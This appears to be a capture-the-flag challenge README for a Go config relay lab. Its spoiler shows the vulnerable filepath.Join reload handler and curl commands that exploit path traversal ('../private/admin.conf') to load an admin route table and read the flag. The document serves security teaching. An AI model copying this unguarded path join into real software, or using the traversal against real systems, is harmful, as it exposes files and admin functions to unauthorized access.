# w20 :: Relay Veil

- **Category:** Infra
- **Difficulty:** hard
- **Stack:** Go / stdlib relay + Python upstream (2 containers)
- **URL:** http://localhost:30020

## Brief

RELAY VEIL owns no routes. It reads route tables from `conf.d/` and dispatches
what they declare. Operators reload tables at runtime so a config change needs
no restart:

```
POST /api/reload?config=public.conf
```

Two tables ship with the image:

| table | purpose |
|---|---|
| `conf.d/public.conf` | the routes the world may see; loaded at boot |
| `private/admin.conf` | the management plane; **outside** the loadable set |

The management table is not secret — it is right there on disk, and the landing
page says so. It is unreachable because the boot scan only reads `conf.d/`, and
the reload endpoint is only supposed to name files inside it. One of those two
claims is enforced by a path join.

## Goal

Get the relay to load the management table, then reach the admin route and read
the flag.

## Hint

`filepath.Join(confDir, name)` makes a **well-formed** path. It does not make a
**contained** one. What does `Join("/srv/relay/conf.d", "../private/admin.conf")`
return?

<details>
<summary>Spoiler</summary>

The reload handler joins the operator-supplied name onto the config directory:

```go
full := filepath.Join(confDir, filename)
body, err := os.ReadFile(full)
```

`filepath.Join` cleans `..` as it joins, so a name that escapes the directory
lands at a clean path *outside* it:

```bash
curl -s -X POST 'http://localhost:30020/api/reload?config=../private/admin.conf'
# {"count":2,"loaded":"/srv/relay/private/admin.conf",
#  "routes":["/admin/secret","/admin/reload"]}
```

The management table is now loaded, so its route resolves:

```bash
curl -s http://localhost:30020/admin/secret
# {"service":"control-0","surface":"control","via_relay":true,"flag":"hex4b0t{...}"}
```

Confirm the route was genuinely absent before — `GET /admin/secret` returning
`{"error":"no route"}` at boot — so you know you loaded it rather than found it
sitting open.

`solution/exploit.sh` runs the chain; `solution/probe.sh` asserts the boot set
still excludes the management table.

</details>
